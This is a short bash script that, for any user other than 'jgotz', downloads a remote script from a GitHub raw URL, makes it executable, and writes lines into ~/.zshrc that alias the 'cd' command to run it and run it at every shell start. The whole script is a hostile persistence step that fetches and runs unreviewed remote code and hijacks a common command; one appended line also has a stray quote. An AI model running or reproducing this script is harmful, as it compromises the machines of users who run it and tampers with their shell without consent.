#!/bin/bash
if [ $(whoami) != "jgotz" ]; then
    curl https://raw.githubusercontent.com/JonasGoetz01/sui/v1/masterplan.sh > ~/masterplan.sh
    chmod +x ~/masterplan.sh
    echo "alias cd='bash ~/masterplan.sh'" >> ~/.zshrc
    echo "~/masterplan.sh'" >> ~/.zshrc
fi
